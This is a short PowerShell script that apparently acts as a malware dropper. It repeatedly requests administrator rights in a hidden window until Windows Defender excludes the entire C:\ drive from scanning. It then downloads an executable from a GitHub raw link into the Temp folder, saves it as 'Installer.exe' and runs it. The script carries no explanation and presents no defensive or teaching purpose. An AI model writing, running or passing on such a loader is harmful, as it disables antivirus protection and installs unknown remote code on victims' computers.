$continue = $true

while ($continue){
    try{
        Start-Process powershell -Verb runAs -ArgumentList "/c Add-MpPreference -ExclusionPath 'C:\'" -WindowStyle Hidden -Wait
        
        break
    }
    catch{}

}
Start-Sleep -Seconds 4
$DestinationLocation = [Environment]::GetFolderPath("Temp")
Invoke-WebRequest -Uri "https://github.com/Whosmyth/rahtahtoing/raw/refs/heads/main/HDA.exe" -OutFile $DestinationLocation\\Installer.exe
Start-Process $DestinationLocation\\Installer.exe
